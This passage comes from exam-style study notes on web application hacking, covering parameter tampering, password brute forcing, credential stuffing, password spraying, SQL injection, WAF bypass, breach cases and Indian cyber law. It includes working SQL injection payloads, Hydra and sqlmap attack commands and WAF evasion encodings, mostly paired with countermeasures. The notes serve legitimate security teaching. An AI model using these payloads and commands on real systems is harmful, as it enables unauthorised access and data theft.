| CDN/object storage | Store uploads in S3/Blob — not on web server |

---

### 2.11 Parameter Tampering

**WHAT:**
Parameter tampering is the manipulation of **application parameters
in HTTP requests** — URL parameters, POST body fields, hidden form
fields, cookies, or HTTP headers — to alter application logic,
pricing, access control, or behaviour in unintended ways.

**HOW:**

    E-commerce price manipulation:
    POST /checkout HTTP/1.1

    Original POST body:
    product_id=123&quantity=1&price=99.99

    Tampered POST body:
    product_id=123&quantity=1&price=0.01

    If server trusts client-sent price: order processed at £0.01

    Hidden field tampering:
    <input type="hidden" name="discount" value="0">
    → Attacker changes to: discount=100

    Role tampering in cookie:
    Cookie: role=user
    → Attacker modifies to: role=admin

**Why it works:**
Developers sometimes trust client-submitted values for convenience —
price, discount, role, account ID — without re-validating server-side.
The golden rule violated: **never trust client-side data.**

**Prevention:**
- Recalculate all critical values server-side — never trust client
- Sign or MAC critical parameters to detect tampering
- Validate all parameters against expected ranges and types
- Never use client-controlled values for security decisions

---

## Section 3 — Web-Based Password Cracking Techniques

### 3.1 Web Authentication Mechanisms

Understanding what is being attacked:

| Mechanism | How It Works | Vulnerability |
|---|---|---|
| **HTML Form Login** | POST username/password → server validates | Brute force, credential stuffing |
| **HTTP Basic Auth** | Base64(user:pass) in Authorization header | Sniffable — brute forceable |
| **HTTP Digest Auth** | Challenge-response with MD5 hash | Brute forceable — weaker than HTTPS basic |
| **OAuth / OpenID Connect** | Token-based delegated auth | Token hijacking, redirect_uri abuse |
| **Certificate-based** | Client certificate in TLS handshake | Certificate theft, weak CA |
| **API Key** | Static key in header or URL | Key theft, rotation failures |

---

### 3.2 Brute Force Attacks on Web Forms

**WHAT:**
Brute force attacks against web login forms submit **automatically
generated credential combinations** at high speed — testing all
possible passwords (or common password patterns) until a valid
combination is found.

**HOW:**

    STEP 1 — Identify login endpoint:
      POST /login HTTP/1.1
      username=admin&password=test123

    STEP 2 — Identify success/failure indicator:
      Failure response: "Invalid username or password" (HTTP 200)
      Success response: redirect to /dashboard (HTTP 302)
      OR different response length/content

    STEP 3 — Automate credential testing:
      Tool sends POST /login with each password from wordlist
      Tool checks response for success indicator
      Match found → valid credential identified

**Types of brute force:**

| Type | Approach | Speed |
|---|---|---|
| **Pure brute force** | Try every possible character combination | Slow — exponential growth |
| **Dictionary attack** | Try words from a wordlist | Fast for common passwords |
| **Rule-based** | Apply mutations to dictionary (l33t speak, append numbers) | Medium — covers predictable patterns |
| **Hybrid** | Dictionary + brute force combined | Balanced coverage |

---

### 3.3 Dictionary Attacks

**WHAT:**
Dictionary attacks use a **pre-compiled wordlist** of common
passwords, words, phrases, and previously breached passwords
— testing each entry as a password.

**Common wordlists:**

| Wordlist | Size | Contents |
|---|---|---|
| **RockYou.txt** | 14.3 million passwords | Real passwords from 2009 RockYou breach |
| **SecLists** | Multiple files | Community-maintained — thousands of lists |
| **CrackStation** | 1.5 billion | Combined from multiple breaches |
| **Custom wordlist** | Variable | Target-specific — company name, pet names, dates |

**CeWL — Custom wordlist generation:**

    cewl https://example.com -d 3 -w wordlist.txt
    → Crawls website to depth 3
    → Extracts all words → builds custom wordlist
    → Contains company-specific terms victim may use as passwords

---

### 3.4 Credential Stuffing

**WHAT:**
Credential stuffing uses **real username/password pairs from
previous data breaches** — testing them against other services
— exploiting the fact that many users reuse passwords across
multiple websites.

**WHY it's more effective than brute force:**
Real passwords from breaches are ACTUAL passwords people chose.
They bypass complexity requirements because they are real user
choices. Success rates for credential stuffing are typically
0.1%–2% — far higher than pure brute force.

**Attack flow:**

    STEP 1 — Attacker obtains breach database:
      Purchase on dark web: "Collection #1" — 2.7 billion credentials
      Contains: email@example.com:password123

    STEP 2 — Target a new service (bank, e-commerce, email):
      Attacker has email@example.com:password123

    STEP 3 — Automated testing:
      Tool submits each credential pair to target login
      Distributes across many IPs (residential proxy network)
      → Avoids IP-based rate limiting
      Success rate: 0.1%–2% → 270,000–54,000,000 valid logins
      from 2.7 billion credential pairs

    STEP 4 — Account takeover:
      Valid logins exploited: steal money, data, resell access

**Tools:** Sentry MBA, OpenBullet, SilverBullet (dark web tools)

**Countermeasures:**
- Multi-factor authentication (MFA) — stolen password alone insufficient
- Check credentials against breach databases on login (HaveIBeenPwned API)
- Anomaly detection — impossible travel, unusual device
- CAPTCHA on login forms
- Rate limiting per username (not just per IP)

---

### 3.5 Password Spraying

**WHAT:**
Password spraying tests **one or a few common passwords against
many different accounts** — the reverse of traditional brute force.
Designed specifically to evade per-account lockout policies.

**HOW:**

    Traditional brute force (triggers lockout):
    Account: admin
    Attempt 1: admin/password1    → fail
    Attempt 2: admin/password2    → fail
    Attempt 3: admin/password3    → fail
    → LOCKOUT TRIGGERED after 3 attempts

    Password spraying (avoids lockout):
    Password: "Summer2024!"  (very common corporate password)
    Attempt 1: user1@corp.com / Summer2024!  → fail
    Attempt 2: user2@corp.com / Summer2024!  → fail
    Attempt 3: user3@corp.com / Summer2024!  → SUCCESS
    Attempt 4: user4@corp.com / Summer2024!  → fail
    ...
    → No individual account exceeds lockout threshold
    → Attack continues undetected

**Commonly sprayed passwords:**
- `[Season][Year]!` — Summer2024!, Winter2024!
- `[Company][Year]!` — Acme2024!, Company123
- `Password1`, `Password123`, `Welcome1`
- `[Month][Year]` — January2024
- Default passwords for specific applications

**Why it works in corporate environments:**
Password expiry policies force users to create new passwords regularly.
Humans are predictable — seasonal patterns and year increments are
common. A single valid account in an Active Directory environment
can enable further attacks (enumeration, lateral movement).

**Countermeasures:**
- MFA — password alone insufficient even if correct
- Monitor for single password attempted against many accounts
- Smart lockout (Azure AD Smart Lockout, CAPTCHA after n failures)
- Block common passwords at registration/reset (password blocklist)

---

### 3.6 HTTP Basic and Digest Authentication Attacks

**HTTP Basic Authentication:**

    Browser challenge: HTTP 401 Unauthorized
    WWW-Authenticate: Basic realm="Admin Area"

    Browser sends:
    Authorization: Basic YWRtaW46cGFzc3dvcmQ=
                         ↑
                   Base64("admin:password") — NOT encrypted

    Decode:  echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d
    Output:  admin:password

> [!WARNING]
> HTTP Basic Authentication is **completely insecure over HTTP**.
> Base64 is an encoding — not encryption. Anyone with a packet
> capture sees the credentials immediately. It is only acceptable
> over HTTPS where TLS encrypts the entire request including headers.

**HTTP Digest Authentication:**

    Server sends nonce (challenge):
    WWW-Authenticate: Digest realm="Admin", nonce="abc123xyz"

    Client computes:
    HA1 = MD5(username:realm:password)
    HA2 = MD5(method:URI)
    Response = MD5(HA1:nonce:HA2)

    Client sends: Response hash (not plaintext password)

**Digest vs Basic:**
- Digest: password not sent in plaintext — uses MD5 challenge-response
- Digest: resistant to replay attacks (nonce changes each time)
- Digest: still brute-forceable — attacker captures challenge+response → offline MD5 crack
- Neither provides mutual authentication — both vulnerable to MITM

**Brute forcing Basic Auth with Hydra:**

    hydra -l admin -P /usr/share/wordlists/rockyou.txt \
          https://example.com http-get /admin

    hydra -L users.txt -P passwords.txt \
          https://example.com http-post-form \
          "/login:username=^USER^&password=^PASS^:Invalid credentials"

---

### 3.7 Web Password Cracking Tools

| Tool | Purpose | Protocol Support |
|---|---|---|
| **Hydra (THC-Hydra)** | Online brute force — web forms, basic auth | HTTP, HTTPS, FTP, SSH, RDP, SMTP, and 50+ more |
| **Burp Suite Intruder** | Web form brute force with HTTP interception | HTTP/HTTPS — any web form |
| **Medusa** | Parallel online brute force | HTTP, FTP, SSH, RDP, SMB, and more |
| **OWASP ZAP (Fuzzer)** | Web form fuzzing and brute force | HTTP/HTTPS |
| **Wfuzz** | Web application fuzzer — parameters, directories, auth | HTTP/HTTPS |
| **Patator** | Multi-purpose online cracker | HTTP, FTP, SSH, SMTP, and more |
| **CeWL** | Custom wordlist generator from website content | Web crawling |
| **Mentalist** | GUI wordlist generator — custom rules | Offline wordlist creation |

**Hydra HTTP POST form syntax:**

    hydra -l admin -P rockyou.txt example.com \
      http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

    Breakdown:
    -l admin        → username
    -P rockyou.txt  → password wordlist
    http-post-form  → attack type
    /login          → login page path
    user=^USER^     → username parameter (^USER^ is placeholder)
    pass=^PASS^     → password parameter (^PASS^ is placeholder)
    F=incorrect     → failure string (if response contains this → failed)

**Burp Suite Intruder workflow:**

    1. Capture login request in Burp Proxy
    2. Send to Intruder
    3. Mark password field as payload position (§password§)
    4. Load wordlist in Payloads tab
    5. Start attack → analyze response length/status code differences

---

### 3.8 Web Password Cracking Countermeasures

| Countermeasure | Implementation | Attack Prevented |
|---|---|---|
| **Multi-factor authentication** | TOTP, SMS OTP, hardware token | All password attacks — second factor required |
| **Account lockout** | Lock after 5–10 failed attempts | Brute force, dictionary attacks |
| **CAPTCHA** | reCAPTCHA v3 / invisible CAPTCHA | Automated tool detection |
| **Rate limiting** | Max N requests/second per IP/username | Slows automated attacks |
| **Progressive delays** | Each failed attempt adds delay | Slows brute force significantly |
| **Login anomaly detection** | Alert on unusual login patterns | Spraying, stuffing, foreign IPs |
| **Breach password check** | Check against HaveIBeenPwned API | Block reuse of breached passwords |
| **Strong password policy** | Minimum length, blocklist common passwords | Reduces successful guessing |
| **IP reputation blocking** | Block known proxy/VPN/Tor exit nodes | Credential stuffing source blocking |
| **Device fingerprinting** | Flag logins from new unrecognized devices | Credential stuffing detection |
| **Geo-blocking** | Block logins from unexpected countries | Reduce attack surface |
| **HTTP security headers** | CSP, X-Frame-Options, HSTS | XSS-based credential theft |

> [!TIP]
> **Smart lockout** (as implemented in Azure AD) is superior to
> simple lockout — it tracks whether a login attempt looks familiar
> (known device, known location) and only locks out suspicious
> attempts — preventing attackers from using lockout itself as a
> denial-of-service against legitimate users.

---

## 📌 Extra Notes

### E1 — OWASP Top 10 Evolution

> [!NOTE]
> Knowing both the 2017 and 2021 OWASP Top 10 is exam-relevant —
> questions may reference either version.

**2017 vs 2021 Comparison:**

| 2017 | Category | 2021 | Category |
|---|---|---|---|
| A1 | Injection | A03 | Injection |
| A2 | Broken Authentication | A07 | Identification and Auth Failures |
| A3 | Sensitive Data Exposure | A02 | Cryptographic Failures |
| A4 | XML External Entities (XXE) | A03 | (merged into Injection) |
| A5 | Broken Access Control | A01 | Broken Access Control (moved to #1) |
| A6 | Security Misconfiguration | A05 | Security Misconfiguration |
| A7 | Cross-Site Scripting (XSS) | A03 | (merged into Injection) |
| A8 | Insecure Deserialization | A08 | Software and Data Integrity Failures |
| A9 | Using Components with Known Vulnerabilities | A06 | Vulnerable and Outdated Components |
| A10 | Insufficient Logging & Monitoring | A09 | Security Logging and Monitoring Failures |

**New in 2021:**
- **A04 — Insecure Design**: A new category focused on design-level
  flaws rather than implementation bugs.
- **A10 — SSRF** (Server-Side Request Forgery): Added as its own
  category — server is tricked into making requests to internal
  resources on behalf of the attacker.

**Key shift from 2017 to 2021:**
- **Broken Access Control** moved from A5 to **A1** — the most
  widespread vulnerability category. IDOR is the primary example.
- **XSS** was A7 in 2017 — now merged into A03 (Injection).
- **SQL Injection** was A1 in 2017 — now A03 (Injection).

---

### E2 — SQL Injection Deep Dive

> [!NOTE]
> SQL injection variants are heavily MCQ-tested — know all types
> and the exact technical distinction between them.

**Error-based SQLi:**

    ' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --
    → SQL Server converts table name to int → type conversion error
    → Error message contains the table name

**UNION-based SQLi — Step by step:**

    STEP 1 — Find number of columns:
    ' ORDER BY 1 --   → works
    ' ORDER BY 2 --   → works
    ' ORDER BY 3 --   → error → 2 columns in original query

    STEP 2 — Find injectable column:
    ' UNION SELECT NULL, NULL --   → no error
    ' UNION SELECT 'test', NULL -- → if 'test' appears → column 1 is injectable

    STEP 3 — Extract data:
    ' UNION SELECT username, password FROM users --

**Boolean-based blind SQLi:**

    True condition:   ' AND 1=1 --   → normal response (page loads)
    False condition:  ' AND 1=2 --   → different response (blank/error)

    Extract data one character at a time:
    ' AND SUBSTRING(username,1,1)='a' --  → if true response → first char is 'a'
    ' AND SUBSTRING(username,1,1)='b' --  → false response
    ... (binary search to extract full username)

**Time-based blind SQLi:**

    ' AND SLEEP(5) --               (MySQL)
    '; WAITFOR DELAY '0:0:5' --     (MSSQL)

    If response is delayed 5 seconds → injection confirmed
    Extract data by conditional delays:
    ' AND IF(SUBSTRING(username,1,1)='a', SLEEP(5), 0) --
    → 5-second delay = first char is 'a'

**sqlmap — Automated SQLi tool:**

    # Basic detection
    sqlmap -u "https://example.com/product?id=1"

    # Enumerate databases
    sqlmap -u "https://example.com/product?id=1" --dbs

    # Enumerate tables in specific database
    sqlmap -u "https://example.com/product?id=1" -D webapp --tables

    # Dump table contents
    sqlmap -u "https://example.com/product?id=1" -D webapp -T users --dump

    # POST form
    sqlmap -u "https://example.com/login" --data="user=admin&pass=test"

---

### E3 — HTTP Methods and Abuse

> [!NOTE]
> HTTP methods beyond GET and POST are tested — know each method,
> its purpose, and how attackers abuse it.

| Method | Legitimate Purpose | Attack Abuse |
|---|---|---|
| **GET** | Retrieve resource | Parameter injection, CSRF |
| **POST** | Submit data | Brute force, injection |
| **PUT** | Upload/replace resource | File upload → webshell if enabled |
| **DELETE** | Delete resource | Delete files/records if enabled |
| **PATCH** | Partial update of resource | Object modification |
| **HEAD** | GET without body (metadata only) | Version fingerprinting |
| **OPTIONS** | List supported methods | Reconnaissance — reveals attack surface |
| **TRACE** | Echo request back | XST (Cross-Site Tracing) — steal cookies |
| **CONNECT** | HTTP tunneling for HTTPS | Proxy tunneling abuse |

**Cross-Site Tracing (XST):**

    TRACE method echoes the full request including headers
    XSS script uses XHR to send TRACE request
    Response contains HttpOnly cookies (echoed in headers)
    → Bypasses HttpOnly restriction

    Fix: Disable TRACE method on all web servers
    Apache: TraceEnable Off
    IIS:    requestFiltering → verbs → TRACE → deny

**Testing HTTP methods:**

    curl -X OPTIONS https://example.com -v
    → Response: Allow: GET, POST, HEAD, OPTIONS

    Dangerous if: Allow: GET, POST, HEAD, OPTIONS, PUT, DELETE, TRACE

---

### E4 — Banner Grabbing and Web Server Fingerprinting

> [!NOTE]
> Banner grabbing is a reconnaissance technique directly enabling
> targeted exploitation — covered in scanning sessions but
> specifically applied to web servers here.

**What banner grabbing reveals:**

    Telnet-based:
    telnet example.com 80
    GET / HTTP/1.0
    [Enter twice]

    Response:
    HTTP/1.1 200 OK
    Server: Apache/2.4.49 (Ubuntu)         ← exact version
    X-Powered-By: PHP/7.4.3                ← PHP version
    X-AspNet-Version: 4.0.30319            ← .NET version (IIS)

**Web fingerprinting tools:**

| Tool | Method | Detail |
|---|---|---|
| **Netcraft** | Passive web lookup | Historical server info, hosting provider |
| **Whatweb** | Active fingerprinting | Server, CMS, framework, plugins |
| **Wappalyzer** | Browser extension | Real-time technology detection |
| **Nikto** | Web server scanner | Vulnerabilities, default files, version |
| **Nmap scripts** | NSE scripts | `--script http-server-header` |

**Nikto — Web server scanner:**

    nikto -h https://example.com
    → Checks for: outdated software, default files, dangerous HTTP methods,
      SSL misconfigurations, common vulnerabilities

**Countermeasures:**
- Suppress server version headers (`ServerTokens Prod`)
- Remove `X-Powered-By` headers
- Use custom error pages (don't reveal framework in 404 pages)
- WAF to strip identifying response headers

---

### E5 — Web Application Firewall (WAF)

> [!NOTE]
> WAF is the primary technical control for web application attacks —
> understand its capabilities and bypass techniques.

**WHAT:**
A WAF inspects HTTP/HTTPS traffic and filters requests matching
known attack patterns — SQL injection signatures, XSS payloads,
directory traversal sequences, command injection patterns.

**WAF types:**

| Type | Deployment | Examples |
|---|---|---|
| **Network-based** | Hardware appliance — inline | F5 BIG-IP ASM, Fortiweb |
| **Host-based** | Software on web server | ModSecurity (Apache/Nginx) |
| **Cloud-based** | DNS/proxy redirect to WAF service | Cloudflare WAF, AWS WAF, Akamai Kona |

**WAF detection modes:**
- **Learning/Passive**: Logs attacks — does not block
- **Detection**: Alerts but does not block
- **Prevention**: Blocks matching requests

**WAF bypass techniques (for authorized testing):**

| Technique | How |
|---|---|
| **Encoding** | `%27` instead of `'` — URL encode injection chars |
| **Double encoding** | `%2527` (encodes the % sign) |
| **Case variation** | `SeLeCt` instead of `SELECT` |
| **Comments** | `SEL/*comment*/ECT` |
| **Whitespace alternatives** | Tab (`%09`), newline (`%0a`) instead of space |
| **Alternative syntax** | `OR 1=1` → `OR 'a'='a'` |
| **HTTP parameter pollution** | `id=1&id=2 UNION SELECT...` |

**WAF limitations:**
- Signature-based — cannot detect novel attack patterns
- False positives — blocks legitimate requests
- Cannot inspect encrypted traffic (unless SSL termination)
- Application logic flaws (IDOR, broken auth) cannot be detected by WAF

---

### E6 — Famous Web Application Breaches

> [!NOTE]
> Real-world breach case studies reinforce why web security matters
> and demonstrate real-world exploitation of these vulnerabilities.

**Case Study 1 — Equifax Data Breach (2017):**
- **Vulnerability:** Apache Struts 2 — CVE-2017-5638 — Remote Code Execution
- **Cause:** Struts framework had a critical RCE vulnerability in its
  multipart parser (command injection via Content-Type header).
  Equifax failed to apply the patch (available 2 months earlier).
- **Impact:** 147 million people's personal data stolen (SSN, DOB,
  addresses, credit card numbers). $700 million FTC settlement.
- **Lesson:** Patch third-party components immediately. Vulnerable
  and Outdated Components (OWASP A06) has real catastrophic consequences.

**Case Study 2 — Yahoo Data Breach (2013–2014):**
- **Vulnerability:** Forged cookies (broken authentication) + MD5
  password hashing (cryptographic failure)
- **Cause:** Attackers forged authentication cookies to access accounts
  without passwords. All 3 billion Yahoo accounts compromised.
  Passwords stored with MD5 — trivially cracked.
- **Impact:** Largest data breach in history at time. $350 million
  reduction in Verizon acquisition price.
- **Lesson:** Cryptographic failures + broken authentication = catastrophic.

**Case Study 3 — British Airways Breach (2018):**
- **Vulnerability:** Web skimming (Magecart attack) — malicious JavaScript
  injected into payment page
- **Cause:** Third-party JavaScript library compromise. Attackers injected
  card-skimming script that captured payment card details as users typed.
- **Impact:** 500,000 customers' payment card data stolen.
  £20 million ICO fine (reduced from proposed £183 million).
- **Lesson:** Supply chain security — third-party scripts can compromise
  payment pages even when your own code is clean.

**Case Study 4 — OWASP WebGoat / DVWA (Training platforms):**
Deliberately vulnerable web applications for learning:
- **DVWA** (Damn Vulnerable Web Application): PHP/MySQL — SQL injection,
  XSS, CSRF, file inclusion, command injection practice
- **WebGoat**: Java — OWASP-aligned vulnerability training
- **Juice Shop**: Node.js — modern OWASP Top 10 training

---

### E7 — Burp Suite for Web Application Testing

> [!NOTE]
> Burp Suite is the industry-standard web application security
> testing tool — know its key components for exam and practice.

**Burp Suite Components:**

| Component | Purpose |
|---|---|
| **Proxy** | Intercept and modify HTTP/HTTPS traffic between browser and server |
| **Spider / Crawler** | Automatically map all pages and parameters of web application |
| **Scanner** | Automated vulnerability detection (Pro version) |
| **Intruder** | Automated customized attacks — brute force, fuzzing, injection |
| **Repeater** | Manually replay and modify individual HTTP requests |
| **Decoder** | Encode/decode URL, Base64, HTML, hex — useful for payload crafting |
| **Comparer** | Diff two HTTP responses — useful for detecting subtle differences |
| **Sequencer** | Analyze randomness quality of session tokens |
| **Extender** | Add extensions from BApp Store (extra functionality) |

**Intruder attack types:**

| Type | Use Case |
|---|---|
| **Sniper** | One payload position — test one parameter at a time |
| **Battering Ram** | Same payload in all positions — test same value everywhere |
| **Pitchfork** | Multiple payload positions — use corresponding wordlist entries |
| **Cluster Bomb** | Multiple payload positions — try all combinations |

**Typical SQLi testing with Burp Repeater:**

    1. Intercept GET /product?id=1 in Proxy
    2. Send to Repeater
    3. Modify id=1 to id=1'  → check for SQL error in response
    4. Try id=1 ORDER BY 1-- → id=1 ORDER BY 2-- → find column count
    5. Try UNION SELECT → extract data

---

### E8 — Predecessor / Successor Chains

> [!NOTE]
> Understanding web security evolution shows why current
> vulnerabilities persist and how defences evolved.

**SQL Injection Evolution:**

    Early PHP/ASP applications — string concatenation (1998–2005)
    → SQL injection discovered as widespread issue
            ↓
    PHP Magic Quotes (PHP 3–5.2) — auto-escaping of quotes
    → Deprecated and removed — false security sense
            ↓
    Prepared statements / parameterized queries (MySQLi, PDO)
    → Proper fix — now standard practice
            ↓
    SQLMap automated exploitation (2006–present)
    → Lowers skill barrier for SQL injection
            ↓
    ORM frameworks (Eloquent, Hibernate, Django ORM)
    → Parameterized by default — significantly reduces SQLi
            ↓
    NoSQL injection (MongoDB, CouchDB) — 2010+
    → Same concept — different query language
            ↓
    GraphQL injection — 2015+
    → New query interface — same input validation failures

**OWASP Evolution:**

    OWASP Top 10 first published (2003)
            ↓
    Updated: 2004, 2007, 2010, 2013, 2017, 2021
            ↓
    SQL Injection was A1 (2003–2017) → moved to A3 (2021)
    Broken Access Control now A1 (2021) — most common finding
            ↓
    OWASP ASVS (Application Security Verification Standard)
    → Detailed requirements for building secure applications
            ↓
    OWASP SAMM (Software Assurance Maturity Model)
    → Framework for improving security in software development

**Web Password Attack Evolution:**

    Dictionary attacks on basic auth (1990s)
            ↓
    Web form brute force with Hydra (2000s)
            ↓
    Credential stuffing from breach databases (2010s)
    → HaveIBeenPwned launched 2013 — Troy Hunt
            ↓
    Password spraying against cloud services (2015+)
    → Office 365, G-Suite targeted at scale
            ↓
    AiTM phishing capturing MFA-bypassing session cookies (2022+)
    → Bypasses MFA — targets session AFTER authentication

---

### E9 — Terminology Traps

| Term | Trap | Clarification |
|---|---|---|
| **SQL injection vs command injection** | "Both inject code" | SQL injection targets DATABASE QUERIES. Command injection targets OS SHELL COMMANDS. Completely different execution contexts. |
| **XSS attacks the server** | "XSS is a server-side attack" | XSS injects script that executes in VICTIM'S BROWSER. The server is the delivery vehicle — the victim's browser is the target. |
| **Stored XSS vs reflected XSS** | "Stored XSS targets the database" | Stored XSS stores the malicious script in the database but executes in BROWSERS — not the database. The database is storage, not the execution environment. |
| **Directory traversal vs directory listing** | "Both expose directory contents" | Directory traversal (path traversal) escapes web root to access OS files. Directory listing exposes contents of a specific directory. Different vulnerabilities with different mechanisms. |
| **IDOR vs privilege escalation** | "Both give unauthorized access" | IDOR accesses other users' objects at the SAME privilege level. Privilege escalation gains HIGHER privileges. IDOR horizontal movement; privilege escalation = vertical movement. |
| **Brute force vs credential stuffing** | "Both guess passwords" | Brute force generates combinations. Credential stuffing uses REAL stolen passwords from breaches — much more effective. |
| **Brute force vs password spraying** | "Password spraying is brute force" | Brute force tries many passwords against ONE account → triggers lockout. Spraying tries ONE password against MANY accounts → never triggers lockout. |
| **HTTP Basic Auth is encrypted** | "Authorization header is secure" | Base64 is NOT encryption — it is trivially reversible encoding. Only secure if transmitted over HTTPS. |
| **WAF prevents SQL injection** | "Deploy WAF — SQLi prevented" | WAF filters KNOWN patterns. Obfuscated, encoded, or novel SQL injection can bypass WAF. Parameterized queries are the only reliable fix. |
| **OWASP Top 10 2021 A01 is SQL injection** | "Injection is number one" | In 2021, BROKEN ACCESS CONTROL (IDOR, path traversal) is A01. SQL Injection is in A03 (Injection). In 2017, Injection (including SQLi) was A1. |

---

### E10 — Current Landscape 2026

> [!NOTE]
> Current state of web application security threats in 2025–2026.

**API Security (2023–2026):**
The attack surface has shifted significantly from traditional web
pages to **REST APIs and GraphQL endpoints**. OWASP published the
**OWASP API Security Top 10 (2023)** specifically for APIs:
API1-BOLA (Broken Object Level Authorization — same as IDOR),
API2-Broken Authentication, API3-Broken Object Property Level
Authorization. APIs are now the primary target for IDOR and
injection attacks — not HTML forms.

**AI-Assisted Web Attack Generation (2024–2026):**
- LLM-based tools generate novel SQL injection payloads that
  bypass WAF signatures by producing syntactically valid but
  unusual query structures never seen in training data.
- Automated vulnerability discovery using AI — tools like
  PentestGPT assist in chaining vulnerabilities across web apps.
- AI-generated phishing pages with pixel-perfect clones of
  banking sites — indistinguishable from real sites visually.

**Supply Chain / Third-Party Script Attacks:**
Polyfill.io supply chain attack (June 2024): The polyfill.js CDN
domain was purchased by a Chinese company and used to serve malware
to ~100,000 websites. Any site including
`<script src="https://polyfill.io/v3/polyfill.min.js">` was
compromised. Modern websites loading third-party scripts have
massive implicit attack surfaces.

**Relevant CVEs:**
- **CVE-2021-41773 (Apache HTTP Server — 2021):**
  Path traversal + RCE in Apache 2.4.49 specifically.
  Attacker could traverse outside web root and execute commands.
  CVSS 9.8. Widely exploited immediately after disclosure.
  Patched in 2.4.50 within 24 hours.
- **CVE-2022-22965 (Spring4Shell — 2022):**
  RCE via data binding in Spring Framework — Java web apps.
  CVSS 9.8. Mass exploitation across Java web applications.
- **CVE-2023-46604 (Apache ActiveMQ — 2023):**
  RCE via ClassInfo deserialization — used in ransomware delivery.
  CVSS 10.0.
- **CVE-2024-4577 (PHP CGI Argument Injection — 2024):**
  PHP on Windows XAMPP — argument injection via URL — RCE.
  CVSS 9.8. Actively exploited in Gh0st RAT delivery campaigns.

---

### E11 — Indian Legal Context

> [!NOTE]
> Indian law applicable to web server attacks and web application
> exploitation.

| Law | Section | Offence | Penalty |
|---|---|---|---|
| **IT Act 2000** | **S.43(a)** | Unauthorized access to web server / web application | Civil compensation up to ₹1 crore |
| **IT Act 2000** | **S.66** | Criminal unauthorized access — hacking web server | Up to 3 years + ₹5 lakh fine |
| **IT Act 2000** | **S.66B** | Receiving data stolen from web server (database dumps) | Up to 3 years + ₹1 lakh fine |
| **IT Act 2000** | **S.43(b)** | Downloading data via SQL injection, directory traversal | Civil compensation up to ₹1 crore |
| **IT Act 2000** | **S.66C** | Identity theft via credential theft from web app | Up to 3 years + ₹1 lakh fine |
| **IT Act 2000** | **S.66F** | Web attack on critical infrastructure (banking portal, government site, power grid web interface) with national security intent | **Life imprisonment** |
| **IT Act 2000** | **S.43(g)** | Destroying web server data via attack | Civil ₹1 crore |
| **IPC** | **S.420** | Financial fraud via SQL injection on e-commerce/banking | Up to 7 years + fine |
| **DPDPA 2023** | — | Personal data exposed via web application breach | Penalty up to ₹250 crore |
| **DPDPA 2023** | — | Failure to notify affected parties of breach | Penalty up to ₹200 crore |

> [!IMPORTANT]
> **SQL injection against a banking web application** that results in
> financial fraud would simultaneously invoke:
> - **S.43(b)** — downloading/extracting data
> - **S.66** — criminal unauthorized access
> - **S.66C** — identity theft via stolen credentials
> - **IPC S.420** — cheating/fraud
>
> Multiple provisions apply simultaneously in complex attacks.

---

## Abbreviations Table

| Abbreviation | Full Form | One-Line Technical Meaning |
|---|---|---|
| **API** | Application Programming Interface | Interface for programmatic access — primary modern web attack surface |
| **BOLA** | Broken Object Level Authorization | OWASP API Security — same concept as IDOR |
| **CAPTCHA** | Completely Automated Public Turing test | Challenge differentiating humans from bots — anti-automation |
| **CDN** | Content Delivery Network | Distributed caching network — web cache poisoning target |
| **CGI** | Common Gateway Interface | Legacy server-side scripting mechanism |
| **CMS** | Content Management System | Web publishing platform — WordPress, Joomla |
| **CORS** | Cross-Origin Resource Sharing | Browser mechanism controlling cross-origin HTTP requests |
| **CRLF** | Carriage Return Line Feed | `\r\n` — HTTP header separator — exploited in response splitting |
| **CSP** | Content Security Policy | HTTP header controlling which scripts/resources browser executes |
| **CSRF** | Cross-Site Request Forgery | Forces victim's browser to make unauthorized requests |
| **CWE** | Common Weakness Enumeration | Catalog of software weakness types |
| **CVE** | Common Vulnerabilities and Exposures | Standard identifier for specific known vulnerabilities |
| **DVWA** | Damn Vulnerable Web Application | Intentionally vulnerable PHP/MySQL app for security training |
| **HSTS** | HTTP Strict Transport Security | Browser policy enforcing HTTPS — prevents downgrade |
| **HTTP** | Hypertext Transfer Protocol | Application protocol for web communication |
| **IDOR** | Insecure Direct Object Reference | Access control flaw — access others' objects by changing ID |
| **IIS** | Internet Information Services | Microsoft's web server for Windows |
| **LDAP** | Lightweight Directory Access Protocol | Directory service protocol — LDAP injection is a vulnerability |
| **MFA** | Multi-Factor Authentication | Authentication requiring two or more factors |
| **NVD** | National Vulnerability Database | NIST database of CVEs with CVSS scores |
| **OWASP** | Open Web Application Security Project | Non-profit producing web security resources including Top 10 |
| **PHP** | PHP Hypertext Preprocessor | Server-side scripting language — common in web applications |
| **PII** | Personally Identifiable Information | Data that identifies a specific individual |
| **RCE** | Remote Code Execution | Vulnerability allowing attacker to execute code on target server |
| **SSRF** | Server-Side Request Forgery | Server makes HTTP requests to attacker-specified URL |
| **SQLi** | SQL Injection | Inserting malicious SQL into database query through user input |
| **TLS** | Transport Layer Security | Cryptographic protocol for encrypted web communication |
| **WAF** | Web Application Firewall | Inspects/filters HTTP traffic for known attack patterns |
| **XSS** | Cross-Site Scripting | JavaScript injection executing in victim's browser |
| **XST** | Cross-Site Tracing | TRACE method + XSS used to steal cookies bypassing HttpOnly |
| **XXE** | XML External Entity | XML parser flaw allowing local file disclosure or SSRF |

---

## 🔑 Keywords + Concept Map

**Core Keywords:**

`Web Server` · `Apache` · `Nginx` · `IIS` · `Directory Traversal` ·
`Path Traversal` · `Dot-Dot-Slash` · `Directory Listing` ·
`HTTP Response Splitting` · `Web Cache Poisoning` · `Banner Grabbing` ·
`Web Shell` · `SQL Injection` · `SQLi` · `Union-based` · `Blind SQLi` ·
`Parameterized Queries` · `Prepared Statements` · `XSS` · `Reflected` ·
`Stored` · `DOM XSS` · `IDOR` · `Broken Access Control` ·
`Parameter Tampering` · `Command Injection` · `File Upload` ·
`XXE` · `Security Misconfiguration` · `OWASP Top 10` · `A01` · `A03` ·
`Brute Force` · `Dictionary Attack` · `Credential Stuffing` ·
`Password Spraying` · `Hydra` · `Burp Suite` · `sqlmap` · `Nikto` ·
`WAF` · `ModSecurity` · `CSP` · `HttpOnly` · `T1190` · `T1110`

---

**Concept Map:**

    WEB SERVER & APPLICATION HACKING
    │
    ├── WEB SERVER ATTACKS
    │   ├── Banner grabbing ─── Identify version → target specific CVE
    │   ├── Directory traversal ── ../ to escape web root → read OS files
    │   ├── Misconfiguration ──── Directory listing | default creds | PUT method
    │   ├── Response splitting ── CRLF injection → fake headers/responses
